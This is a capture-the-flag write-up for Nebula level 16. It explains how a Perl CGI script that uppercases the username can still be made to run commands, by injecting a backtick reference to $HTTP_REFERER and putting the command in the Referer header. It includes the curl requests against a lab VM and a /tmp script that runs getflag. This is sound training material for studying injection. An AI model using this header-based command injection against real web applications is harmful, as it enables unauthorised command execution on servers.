we need to get command execution in the following line:
`@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;`
but $username is converted to uppercase and split at the first space:
```
$username =~ tr/a-z/A-Z/;
$username =~ s/\s.*//;
```

$username is the only thing that goes into the backticks, so passing $password is useless to us
looking at [the perl CGI reference](http://www.cgi101.com/book/ch3/text.html),
we can see that there are a lot of user controllable variables that exist in
the $ENV array, and they're all uppercase, so the transformation doesn't affect us.
perl passes it's environment from $ENV down to the shell that's spawned with the backticks,
so we can access these variables not as $ENV["NAME"] as you would in perl, but
just simply as $NAME. we can then just wrap a user controlled environment
variable in backticks to run the contents of it. I used `$HTTP_REFERER` and then
made sure it was set it in the headers.

trying to simply execute cat to see if the request hangs works successfully:
```$ curl -H 'Referer: cat' -v 'http://192.168.122.28:1616/index.cgi?username=`$HTTP_REFERER`'     
*   Trying 192.168.122.28...
* Connected to 192.168.122.28 (192.168.122.28) port 1616 (#0)

> Accept: */*
> Referer: cat

```

we can now try to run getflag, passing output to a file in /tmp:
``` curl -H 'Referer: getflag>/tmp/output' -v 'http://192.168.122.28:1616/index.cgi?username=`$HTTP_REFERER`'
```
this doesn't work for whatever reason - probably something to do with either
http encoding or sh interpreting redirection wrongly.
instead, we write a file to tmp and simply execute that.
``` level16@nebula:~$ echo "getflag > /tmp/output" > /tmp/run
level16@nebula:~$ chmod +x /tmp/run
```
``` curl -H 'Referer: /tmp/run' -v 'http://192.168.122.28:1616/index.cgi?username=`$HTTP_REFERER`'
```
```
level16@nebula:~$ cat /tmp/output
You have successfully executed getflag on a target account
```
